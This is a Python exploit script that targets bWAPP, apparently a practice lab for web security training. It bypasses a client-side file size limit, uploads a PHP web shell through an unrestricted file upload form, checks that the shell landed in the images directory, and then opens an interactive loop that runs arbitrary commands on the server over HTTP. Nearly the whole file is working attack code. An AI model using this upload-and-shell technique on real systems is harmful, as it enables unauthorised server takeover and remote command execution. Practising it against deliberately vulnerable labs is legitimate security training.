from bWAPP import login, TARGET
from re import search, S
from pathlib import Path

# Do login
bwapp_session = login(verbose=True)

if not bwapp_session:
    exit(1)

# Upload local file shell-low.php
SHELL_FILE = "shell-low.php"
BASE_DIR = Path(__file__).resolve().parent
LOCAL_SHELL_FILE = f"{Path.joinpath(BASE_DIR, SHELL_FILE)}"

with open(LOCAL_SHELL_FILE, 'rb') as file:
    files = {
        "file": (SHELL_FILE, file, "application/octet-stream")
    }

    data = {
        "MAX_FILE_SIZE": "9999", # Bypass max file size
        "form": "Upload"
    }

    try:
        print("[+] Set MAX_FILE_SIZE param to 9999 instead of 10 to bypass file size check.")
        print(f"[+] Uploading {SHELL_FILE} ...")
        
        bwapp_session.post(f"{TARGET}/unrestricted_file_upload.php", files=files, data=data)
        
        # Check if file exist after upload
        print(f"[+] Check file into images directory ...")
        file_path = f"{TARGET}/images/{SHELL_FILE}"
        check_file = bwapp_session.get(file_path)
        if check_file.status_code == 200:
            print(f"[+] Shell uploaded to {file_path}\n")
        else:
            print("[-] Error while upload shell...\n Exiting.")
            exit(1)
    except Exception as error:
        print(error)

# Use local shell to send commands over HTTP connection using new file uploaded
print("[+] Starting interactive shell connection ...")
while True:
    cmd = input("Shell > ").strip()

    if not cmd:
        continue

    if cmd in ("exit", "quit", "stop"):
        break

    rce = bwapp_session.get(f"{TARGET}/images/{SHELL_FILE}", params={ "cmd": cmd})
    output = search(r'<div class="output">(.*?)</div>', rce.text, S)
    print(output.group(1).strip())